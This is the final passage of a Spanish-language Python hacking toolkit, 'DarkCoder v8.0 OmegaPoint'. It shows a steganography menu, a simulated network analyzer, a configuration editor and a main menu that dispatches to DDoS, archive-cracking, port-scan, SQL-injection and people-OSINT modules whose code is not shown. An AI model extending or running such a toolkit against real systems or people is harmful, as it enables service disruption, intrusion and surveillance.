                        if plaintext_aes_d:
                            UI.imprimir_exito(f"Texto Descifrado: {plaintext_aes_d}")
                        else: UI.imprimir_error("Fallo al descifrar. Verifica todos los inputs (contraseña, salt, iv, ciphertext, tag).")
                    except ValueError as ve: UI.imprimir_error(f"Error en formato de input (hex/Base64): {ve}")
                    except Exception as e_aes_d_main: UI.imprimir_error(f"Error general en descifrado AES: {e_aes_d_main}")
            
            elif opcion == "8": # Esteganografía LSB
                if not PILLOW_DISPONIBLE: UI.imprimir_error("Librería 'Pillow' no disponible."); UI.presionar_enter_continuar(); continue
                accion_lsb = UI.obtener_entrada("¿[O]cultar o [R]evelar mensaje en imagen? ", opciones_validas=["O","R","o","r"], default="O").upper()
                ruta_img_lsb = UI.obtener_entrada("Ruta de la imagen (.png, .bmp, etc.): ", requerido=True)
                if not ruta_img_lsb or not os.path.exists(ruta_img_lsb): UI.imprimir_error("Imagen no encontrada."); continue

                if accion_lsb == "O":
                    msg_lsb_o = UI.obtener_entrada("Mensaje a ocultar: ", requerido=True)
                    if msg_lsb_o: self._esteganografia_lsb_imagen(ruta_img_lsb, "ocultar", msg_lsb_o)
                elif accion_lsb == "R":
                    salida_revelado_lsb = UI.obtener_entrada("Ruta para guardar mensaje revelado (opcional, si no, se imprime): ", requerido=False)
                    self._esteganografia_lsb_imagen(ruta_img_lsb, "revelar", salida_revelado_lsb)

            elif opcion == "9": break
            if opcion != "9": UI.presionar_enter_continuar()


# ===== [ ANALIZADOR DE RED "NETSPECTRE PRIME" ] =====
class AnalizadorRed:
    ART_ASCII = f"""{Colores.CYAN}
███╗   ██╗███████╗████████╗ ██████╗ ███████╗██████╗  ██████╗ ████████╗███████╗
████╗  ██║██╔════╝╚══██╔══╝██╔═══██╗██╔════╝██╔══██╗██╔════╝ ╚══██╔══╝██╔════╝
██╔██╗ ██║█████╗     ██║   ██║   ██║█████╗  ██████╔╝██║  ███╗   ██║   █████╗  
██║╚██╗██║██╔══╝     ██║   ██║   ██║██╔══╝  ██╔══██╗██║   ██║   ██║   ██╔══╝  
██║ ╚████║███████╗   ██║   ╚██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ███████╗
╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
{Colores.BLANCO}                           Analizador de Red "NetSpectre Prime"{Colores.RESET}"""
    # ... (Implementación completa de AnalizadorRed - Extensa)
    # Implica: Ping Sweep (subprocess), Traceroute (subprocess o scapy),
    # Sniffer Básico (raw sockets o scapy, muy dependiente de OS y permisos),
    # Ejecutor de Nmap (subprocess, usando la config para el path de nmap).
    # El parseo de Nmap ya está en EscanerPuertosAvanzado, se puede reutilizar.
    def __init__(self): 
        UI.imprimir_mensaje(self.ART_ASCII, Colores.CYAN, prefix="")
        logging.info("AnalizadorRed (NetSpectre Prime) inicializado - Funcionalidad Principal Pendiente de Desarrollo Completo.")
        UI.imprimir_advertencia("NetSpectre Prime: Módulo en desarrollo avanzado. Funcionalidad actual limitada a placeholder.")

    def menu_analizador_red(self):
        UI.imprimir_advertencia("Funcionalidad de Analizador de Red (NetSpectre Prime) está en desarrollo y no implementada completamente.")
        UI.imprimir_mensaje("Se requeriría integración con herramientas como Nmap, ping, traceroute, y potencialmente Scapy para sniffing.", Colores.GRIS)
        # Placeholder
        op_net = UI.obtener_entrada("[1] Ping Sweep (Simulado)\n[2] Traceroute (Simulado)\n[3] Volver\nOpción: ", opciones_validas=['1','2','3'])
        if op_net == '1':
            cidr_ping = UI.obtener_entrada("Rango CIDR para Ping Sweep (ej: 192.168.1.0/24): ", default="192.168.1.0/24")
            UI.imprimir_mensaje(f"Simulando Ping Sweep en {cidr_ping}...", Colores.CYAN)
            time.sleep(0.5)
            # Simular algunas IPs activas
            try:
                net = ipaddress.ip_network(cidr_ping, strict=False)
                active_ips_sim = random.sample(list(net.hosts()), min(5, net.num_addresses -2 if net.num_addresses > 2 else 1))
                UI.imprimir_exito(f"IPs activas simuladas en {cidr_ping}:")
                for ip_sim in active_ips_sim: UI.imprimir_mensaje(f"  - {ip_sim} está ARRIBA", Colores.BLANCO)
            except ValueError: UI.imprimir_error("CIDR inválido.")

        elif op_net == '2':
            target_trace = UI.obtener_entrada("Objetivo para Traceroute (ej: google.com): ", default="google.com")
            UI.imprimir_mensaje(f"Simulando Traceroute a {target_trace}...", Colores.CYAN)
            time.sleep(0.5)
            UI.imprimir_exito(f"Traceroute simulado a {target_trace}:")
            hops_sim = [f"1 ms  1 ms  1 ms  192.168.1.1 (Router Local)",
                        f"10 ms 12 ms 11 ms  isp-gw.example.net (10.0.0.1)",
                        f"20 ms 22 ms 21 ms  core-router.example.net (203.0.113.5)",
                        f"30 ms 30 ms 31 ms  {target_trace} (Simulado: 172.217.160.142)"]
            for hop_sim in hops_sim: UI.imprimir_mensaje(f"  {hop_sim}", Colores.BLANCO)
        
        if op_net != '3': UI.presionar_enter_continuar()

# ===== [ FUNCIÓN DE CONFIGURACIÓN GENERAL Y UTILIDADES ] =====
def menu_configuracion_avanzada():
    global CONFIG
    while True:
        limpiar_pantalla(); UI.imprimir_banner_animado()
        UI.imprimir_mensaje("Configuración Avanzada & Utilidades de DarkCoder OmegaPoint", Colores.MAGENTA)
        
        config_items_display = list(CONFIG.items())
        for i, (key_cfg, value_cfg) in enumerate(config_items_display):
            display_val_cfg = "*******" if ("api_key" in key_cfg.lower() or "token" in key_cfg.lower()) and value_cfg else value_cfg
            UI.imprimir_mensaje(f"[{i+1}] {key_cfg.replace('_', ' ').title()}: {Colores.AMARILLO}{display_val_cfg}{Colores.BLANCO}", Colores.BLANCO)
        
        num_conf_items = len(config_items_display)
        UI.imprimir_mensaje("-" * 70, Colores.GRIS)
        UI.imprimir_mensaje(f"[{num_conf_items+1}] Guardar Cambios y Volver", Colores.VERDE)
        UI.imprimir_mensaje(f"[{num_conf_items+2}] Restaurar Configuración por Defecto", Colores.AMARILLO)
        UI.imprimir_mensaje(f"[{num_conf_items+3}] Ver Log Actual ({LOG_FILE})", Colores.CYAN)
        UI.imprimir_mensaje(f"[{num_conf_items+4}] Limpiar Archivo de Log", Colores.ROJO)
        UI.imprimir_mensaje(f"[{num_conf_items+5}] Volver sin Guardar", Colores.ROJO)

        opcion_menu_cfg = UI.obtener_entrada("[+] Elige una opción para modificar o acción: ", tipo=int, opciones_validas=range(1, num_conf_items+6))

        if 1 <= opcion_menu_cfg <= num_conf_items:
            key_a_editar_cfg = config_items_display[opcion_menu_cfg-1][0]
            valor_actual_cfg = CONFIG[key_a_editar_cfg]
            
            # Determinar tipo esperado y si es oculto
            tipo_esperado_cfg = type(DEFAULT_CONFIG.get(key_a_editar_cfg, "")) # Usar tipo del default como guía
            if valor_actual_cfg is not None: tipo_esperado_cfg = type(valor_actual_cfg)


            es_oculto_cfg = ("api_key" in key_a_editar_cfg.lower() or "token" in key_a_editar_cfg.lower())
            
            nuevo_valor_str_cfg = UI.obtener_entrada(
                f"[+] Nuevo valor para '{key_a_editar_cfg}' (actual: {'*******' if es_oculto_cfg and valor_actual_cfg else valor_actual_cfg}, tipo: {tipo_esperado_cfg.__name__}): ",
                ocultar_entrada=es_oculto_cfg, default=str(valor_actual_cfg) if valor_actual_cfg is not None else "", requerido=False
            )
            
            try:
                if nuevo_valor_str_cfg == "" and (valor_actual_cfg is None or tipo_esperado_cfg == str): # Permitir vaciar strings o mantener None
                    CONFIG[key_a_editar_cfg] = None if tipo_esperado_cfg != str else ""
                elif tipo_esperado_cfg == bool:
                    CONFIG[key_a_editar_cfg] = nuevo_valor_str_cfg.lower() in ['true', 's', 'si', 'yes', 'y', '1', 'on']
                elif tipo_esperado_cfg == int:
                     CONFIG[key_a_editar_cfg] = int(nuevo_valor_str_cfg)
                elif tipo_esperado_cfg == float:
                     CONFIG[key_a_editar_cfg] = float(nuevo_valor_str_cfg)
                # No soportar edición de dict/list directamente aquí, es muy complejo para input simple.
                # Para proxies_file, es una ruta de archivo (str).
                else: # str o None (se tratará como str)
                    CONFIG[key_a_editar_cfg] = nuevo_valor_str_cfg if nuevo_valor_str_cfg.strip() else None
                
                UI.imprimir_exito(f"'{key_a_editar_cfg}' actualizado temporalmente. Recuerda guardar.")
                logging.info(f"Configuración '{key_a_editar_cfg}' cambiada temporalmente.")
            except ValueError:
                UI.imprimir_error(f"Valor inválido para el tipo esperado {tipo_esperado_cfg.__name__}.")
            UI.presionar_enter_continuar()
        
        elif opcion_menu_cfg == num_conf_items + 1: # Guardar y Volver
            guardar_configuracion()
            configurar_logging() # Re-configurar logging si cambió el nivel
            break
        elif opcion_menu_cfg == num_conf_items + 2: # Restaurar Defaults
            if UI.obtener_entrada("[+] ¿SEGURO que quieres restaurar la configuración por defecto? (s/n): ", tipo=bool, default=False):
                CONFIG = DEFAULT_CONFIG.copy()
                UI.imprimir_exito("Configuración restaurada a los valores por defecto.")
                logging.info("Configuración restaurada a valores por defecto.")
                guardar_configuracion()
                configurar_logging()
            UI.presionar_enter_continuar()
        elif opcion_menu_cfg == num_conf_items + 3: # Ver Log
            limpiar_pantalla()
            UI.imprimir_mensaje(f"Mostrando últimas 50 líneas de {LOG_FILE} (o menos si es corto):", Colores.CYAN)
            try:
                with open(LOG_FILE, 'r', encoding='utf-8') as f_log_view:
                    log_lines = f_log_view.readlines()
                for line in log_lines[-50:]: print(f"{Colores.GRIS}{line.strip()}{Colores.RESET}")
            except FileNotFoundError: UI.imprimir_error(f"Archivo de log {LOG_FILE} no encontrado.")
            except Exception as e_log_view: UI.imprimir_error(f"Error leyendo log: {e_log_view}")
            UI.presionar_enter_continuar()
        elif opcion_menu_cfg == num_conf_items + 4: # Limpiar Log
            if UI.obtener_entrada(f"[+] ¿SEGURO que quieres limpiar el archivo de log {LOG_FILE}? (s/n): ", tipo=bool, default=False):
                try:
                    with open(LOG_FILE, 'w') as f_log_clear: # Abrir en modo 'w' lo trunca
                        pass
                    UI.imprimir_exito(f"Archivo de log {LOG_FILE} limpiado.")
                    logging.info("Archivo de log limpiado por el usuario.") # Esto se escribirá al nuevo log
                except Exception as e_log_clear: UI.imprimir_error(f"Error limpiando log: {e_log_clear}")
            UI.presionar_enter_continuar()
        elif opcion_menu_cfg == num_conf_items + 5: # Volver sin Guardar
            cargar_configuracion() # Recargar desde archivo para descartar cambios no guardados
            break

# ===== [ FUNCIÓN PRINCIPAL Y BUCLE DEL MENÚ ] =====
def main():
    config_original_existia = os.path.exists(CONFIG_FILE)
    cargar_configuracion() # Carga o usa defaults, y configura logging
    
    if config_original_existia:
        UI.imprimir_exito(f"Configuración cargada desde {CONFIG_FILE}.")
    else:
        UI.imprimir_advertencia(f"Archivo {CONFIG_FILE} no encontrado. Usando defaults y creando uno nuevo al guardar.")
        # Guardar config por defecto si no existía
        guardar_configuracion(notify=False) 
        UI.imprimir_exito(f"Archivo de configuración por defecto {CONFIG_FILE} creado.")
    
    UI.imprimir_mensaje(f"Nivel de log (archivo): {CONFIG.get('log_level', 'INFO').upper()}. Logs en: {LOG_FILE}", Colores.GRIS)
    logging.info(f"DarkCoder v8.0 OmegaPoint iniciado. User-Agent: {CONFIG.get('default_user_agent')}")
    
    optional_libs_map = {
        "rarfile (Descifrado RAR)": RARFILE_DISPONIBLE, "py7zr (Descifrado 7Z)": PY7ZR_DISPONIBLE,
        "tqdm (Barras de Progreso)": TQDM_DISPONIBLE, 
        "Pillow (EXIF OSINT, Stego LSB)": PILLOW_DISPONIBLE,
        "pypdf (Metadatos PDF OSINT)": PYPDF_DISPONIBLE, 
        "python-docx (Metadatos DOCX OSINT)": PYTHON_DOCX_DISPONIBLE,
        "openpyxl (Metadatos XLSX OSINT)": OPENPYXL_DISPONIBLE, 
        "shodan (Consulta Shodan)": SHODAN_LIB_DISPONIBLE,
        "cryptography (Cifrado AES)": CRYPTOGRAPHY_LIB_DISPONIBLE
    }
    libs_faltantes = [(name, dep_var) for name, dep_var in optional_libs_map.items() if not dep_var]
    if libs_faltantes:
        UI.imprimir_advertencia("Algunas funcionalidades opcionales pueden estar limitadas o no disponibles:")
        for lib_name_faltante, _ in libs_faltantes:
            UI.imprimir_advertencia(f"  - Módulo '{lib_name_faltante.split(' (')[0]}' no encontrado. Funcionalidad: {lib_name_faltante.split(' (')[1][:-1]}")
            logging.warning(f"Librería opcional faltante: {lib_name_faltante}")
        time.sleep(2)

    UI.imprimir_banner_animado()
    
    try:
        descifrador_inst = DescifradorArchivos()
        simulador_ddos_inst = SimuladorDDoS() 
        escaner_puertos_inst = EscanerPuertosAvanzado()
        escaner_sqli_inst = EscanerSQLi() # Placeholder
        osint_web_inst = OSINTWeb() # Placeholder
        osint_personas_inst = OSINTPersonas() # Placeholder
        utilidades_cripto_inst = UtilidadesCripto()
        analizador_red_inst = AnalizadorRed() # Placeholder
    except Exception as e_instanciar:
        UI.imprimir_error(f"Error fatal al inicializar módulos principales: {e_instanciar}")
        logging.critical(f"Error fatal al inicializar módulos: {e_instanciar}", exc_info=True)
        return

    while True:
        UI.imprimir_menu()
        opcion_principal = UI.obtener_entrada("[+] Elige una opción Omega (1-10): ", Colores.MAGENTA, tipo=int, opciones_validas=range(1,11))

        limpiar_pantalla_despues = True 

        if opcion_principal == 1: descifrador_inst.descifrar()
        elif opcion_principal == 2:
            if simulador_ddos_inst.proceder: simulador_ddos_inst.lanzar_ataque()
            # Si no procede, el constructor ya maneja la advertencia.
            # Si el usuario cancela en el constructor, .proceder será False.
            # Si cancela en la confirmación de lanzamiento, el método lanzar_ataque retorna.
        elif opcion_principal == 3: escaner_puertos_inst.escanear()
        elif opcion_principal == 4: escaner_sqli_inst.escanear_objetivo()
        elif opcion_principal == 5: osint_web_inst.investigar()
        elif opcion_principal == 6: osint_personas_inst.investigar_persona()
        elif opcion_principal == 7: utilidades_cripto_inst.menu_utilidades(); limpiar_pantalla_despues=False
        elif opcion_principal == 8: analizador_red_inst.menu_analizador_red(); limpiar_pantalla_despues=False
        elif opcion_principal == 9: menu_configuracion_avanzada(); limpiar_pantalla_despues=False
        elif opcion_principal == 10:
            UI.imprimir_mensaje("¡Gracias por usar DarkCoder v8.0 OmegaPoint! Desplegando secuencia de salida...", Colores.AZUL + Colores.NEGRITA)
            logging.info("DarkCoder v8.0 OmegaPoint finalizado por el usuario.")
            time.sleep(1.2)
            limpiar_pantalla()
            sys.exit(0)
        
        if limpiar_pantalla_despues:
            UI.presionar_enter_continuar()
            limpiar_pantalla()
            UI.imprimir_banner_animado()
        else:
            limpiar_pantalla()
            UI.imprimir_banner_animado()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n") 
        UI.imprimir_advertencia("Ejecución interrumpida por el usuario (Ctrl+C). Saliendo de DarkCoder...")
        if 'logging' in sys.modules: logging.warning("Interrupción global por usuario (Ctrl+C).")
        time.sleep(0.5)
        limpiar_pantalla()
        sys.exit(130) # Código de salida para interrupción
    except Exception as e_global_fatal:
        limpiar_pantalla()
        print(f"{Colores.ROJO}{Colores.NEGRITA}[FALLO CATASTRÓFICO INESPERADO EN DARKCODER OMEGA POINT]{Colores.RESET}")
        print(f"{Colores.ROJO}Tipo de Error: {type(e_global_fatal).__name__}{Colores.RESET}")
        print(f"{Colores.ROJO}Mensaje: {e_global_fatal}{Colores.RESET}")
        import traceback
        print("\n" + "="*20 + " RASTRO DE PILA DETALLADO " + "="*20)
        traceback.print_exc()
        print("="*70)
        print(f"{Colores.AMARILLO}Se ha producido un error grave. Revisa {LOG_FILE} para más detalles.{Colores.RESET}")
        if 'logging' in sys.modules:
            logging.critical(f"Error fatal no capturado en main: {type(e_global_fatal).__name__} - {e_global_fatal}", exc_info=True)
        input("Presiona ENTER para salir.")
        sys.exit(1)
